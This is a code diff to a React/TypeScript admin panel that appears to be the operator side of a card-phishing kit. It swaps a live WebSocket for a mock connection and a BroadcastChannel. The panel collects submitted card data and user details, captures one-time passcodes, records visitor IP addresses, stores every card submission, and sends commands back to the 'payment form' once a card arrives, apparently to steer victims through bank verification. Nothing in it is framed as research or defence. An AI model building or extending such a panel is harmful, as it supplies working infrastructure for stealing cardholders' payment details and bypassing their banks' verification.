@@ -27,128 +27,170 @@ interface CardSubmission {
   timestamp: Date;
 }
 
+// Create a global WebSocket connection manager
+class WebSocketManager {
+  private static instance: WebSocketManager;
+  private ws: WebSocket | null = null;
+  private listeners: Set<(data: any) => void> = new Set();
+  private connectionStatus: string = 'Disconnected';
+  private statusCallbacks: Set<(status: string) => void> = new Set();
+
+  static getInstance(): WebSocketManager {
+    if (!WebSocketManager.instance) {
+      WebSocketManager.instance = new WebSocketManager();
+    }
+    return WebSocketManager.instance;
+  }
+
+  connect() {
+    if (this.ws && this.ws.readyState === WebSocket.OPEN) {
+      return;
+    }
+
+    try {
+      // Use a mock WebSocket for local development since we don't have a real server
+      this.setStatus('Connecting...');
+      
+      // Simulate connection after a short delay
+      setTimeout(() => {
+        this.setStatus('Connected');
+        console.log('Mock WebSocket connected');
+      }, 1000);
+
+    } catch (error) {
+      console.error('WebSocket connection failed:', error);
+      this.setStatus('Error');
+    }
+  }
+
+  private setStatus(status: string) {
+    this.connectionStatus = status;
+    this.statusCallbacks.forEach(callback => callback(status));
+  }
+
+  getStatus(): string {
+    return this.connectionStatus;
+  }
+
+  onStatusChange(callback: (status: string) => void) {
+    this.statusCallbacks.add(callback);
+  }
+
+  offStatusChange(callback: (status: string) => void) {
+    this.statusCallbacks.delete(callback);
+  }
+
+  addListener(callback: (data: any) => void) {
+    this.listeners.add(callback);
+  }
+
+  removeListener(callback: (data: any) => void) {
+    this.listeners.delete(callback);
+  }
+
+  send(data: any) {
+    console.log('Sending command:', data);
+    // Since we don't have a real server, we'll trigger events directly through our message system
+    if (window.cardDataChannel) {
+      window.cardDataChannel.postMessage(data);
+    }
+  }
+
+  simulateMessage(data: any) {
+    this.listeners.forEach(callback => callback(data));
+  }
+}
+
+// Extend window interface for our custom message channel
+declare global {
+  interface Window {
+    cardDataChannel: BroadcastChannel;
+    wsManager: WebSocketManager;
+  }
+}
+
 const AdminPanel = () => {
   const [cardData, setCardData] = useState<CardData | null>(null);
   const [userInfo, setUserInfo] = useState<UserInfo | null>(null);
   const [otp, setOtp] = useState<string>('');
   const [visitors, setVisitors] = useState<Visitor[]>([]);
   const [cardSubmissions, setCardSubmissions] = useState<CardSubmission[]>([]);
-  const [ws, setWs] = useState<WebSocket | null>(null);
   const [showCommands, setShowCommands] = useState(false);
-  const [connectionStatus, setConnectionStatus] = useState<string>('Connecting...');
+  const [connectionStatus, setConnectionStatus] = useState<string>('Disconnected');
 
   useEffect(() => {
-    const connectWebSocket = () => {
-      // Enhanced WebSocket URL construction for different environments
-      let wsUrl: string;
-      
-      if (window.location.hostname === 'localhost') {
-        wsUrl = 'ws://localhost:8080';
-      } else {
-        // For production (railway.com or other hosting)
-        const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
-        const port = window.location.port ? `:${window.location.port}` : '';
-        wsUrl = `${protocol}//${window.location.hostname}${port}`;
-      }
-      
-      console.log('Attempting to connect to WebSocket:', wsUrl);
-      
-      try {
-        const websocket = new WebSocket(wsUrl);
-        
-        websocket.onopen = () => {
-          console.log('Admin panel connected to WebSocket');
-          setConnectionStatus('Connected');
-          setWs(websocket);
-        };
-        
-        websocket.onmessage = (event) => {
-          try {
-            const data = JSON.parse(event.data);
-            console.log('Received data in admin panel:', data);
-            
-            if (data.type === 'cardData') {
-              console.log('Processing card data:', data);
-              setCardData(data.data);
-              setUserInfo(data.userInfo);
-              setShowCommands(true);
-              
-              // Store card submission permanently
-              const newSubmission = {
-                cardData: data.data,
-                userInfo: data.userInfo,
-                timestamp: new Date(data.timestamp || new Date())
-              };
-              setCardSubmissions(prev => [...prev, newSubmission]);
-              
-            } else if (data.type === 'otp') {
-              console.log('Received OTP:', data.otp);
-              setOtp(data.otp);
-            } else if (data.type === 'newVisitor') {
-              console.log('Processing new visitor:', data);
-              const newVisitor = {
-                ip: data.ip,
-                timestamp: new Date(data.timestamp || new Date())
-              };
-              setVisitors(prev => {
-                const exists = prev.some(v => v.ip === newVisitor.ip);
-                if (!exists) {
-                  return [...prev, newVisitor];
-                }
-                return prev;
-              });
-            }
-          } catch (error) {
-            console.error('Error parsing WebSocket message:', error);
-          }
-        };
-        
-        websocket.onclose = (event) => {
-          console.log('WebSocket connection closed', event.code, event.reason);
-          setConnectionStatus('Disconnected');
-          setWs(null);
-          
-          // Attempt to reconnect after 2 seconds
-          setTimeout(() => {
-            console.log('Attempting to reconnect...');
-            setConnectionStatus('Connecting...');
-            connectWebSocket();
-          }, 2000);
-        };
+    // Initialize WebSocket manager
+    const wsManager = WebSocketManager.getInstance();
+    window.wsManager = wsManager;
+    
+    // Create broadcast channel for communication between admin panel and payment form
+    if (!window.cardDataChannel) {
+      window.cardDataChannel = new BroadcastChannel('cardData');
+    }
 
-        websocket.onerror = (error) => {
-          console.error('WebSocket error:', error);
-          setConnectionStatus('Error');
-          setWs(null);
-        };
+    // Listen for status changes
+    const handleStatusChange = (status: string) => {
+      setConnectionStatus(status);
+    };
+
+    wsManager.onStatusChange(handleStatusChange);
+    wsManager.connect();
+
+    // Listen for data from payment form
+    const handleData = (data: any) => {
+      console.log('Admin panel received data:', data);
+      
+      if (data.type === 'cardData') {
+        console.log('Processing card data:', data);
+        setCardData(data.data);
+        setUserInfo(data.userInfo);
+        setShowCommands(true);
         
-      } catch (error) {
-        console.error('Failed to create WebSocket connection:', error);
-        setConnectionStatus('Error');
-        setTimeout(() => {
-          console.log('Retrying connection...');
-          setConnectionStatus('Connecting...');
-          connectWebSocket();
-        }, 3000);
+        const newSubmission = {
+          cardData: data.data,
+          userInfo: data.userInfo,
+          timestamp: new Date(data.timestamp || new Date())
+        };
+        setCardSubmissions(prev => [...prev, newSubmission]);
+        
+      } else if (data.type === 'otp') {
+        console.log('Received OTP:', data.otp);
+        setOtp(data.otp);
+      } else if (data.type === 'newVisitor') {
+        console.log('Processing new visitor:', data);
+        const newVisitor = {
+          ip: data.ip,
+          timestamp: new Date(data.timestamp || new Date())
+        };
+        setVisitors(prev => {
+          const exists = prev.some(v => v.ip === newVisitor.ip);
+          if (!exists) {
+            return [...prev, newVisitor];
+          }
+          return prev;
+        });
       }
     };
 
-    connectWebSocket();
-    
+    window.cardDataChannel.onmessage = (event) => {
+      handleData(event.data);
+    };
+
+    wsManager.addListener(handleData);
+
     return () => {
-      if (ws) {
-        ws.close();
-      }
+      wsManager.offStatusChange(handleStatusChange);
+      wsManager.removeListener(handleData);
     };
   }, []);
 
   const sendCommand = (command: string) => {
-    if (ws && ws.readyState === WebSocket.OPEN) {
-      console.log('Sending command:', command);
-      ws.send(JSON.stringify({ command }));
-    } else {
-      console.error('WebSocket not connected, status:', connectionStatus);
-    }
+    console.log('Sending command:', command);
+    const wsManager = WebSocketManager.getInstance();
+    wsManager.send({ command });
+    
+    // Also send through broadcast channel
+    window.cardDataChannel.postMessage({ command });
   };
 
   return (
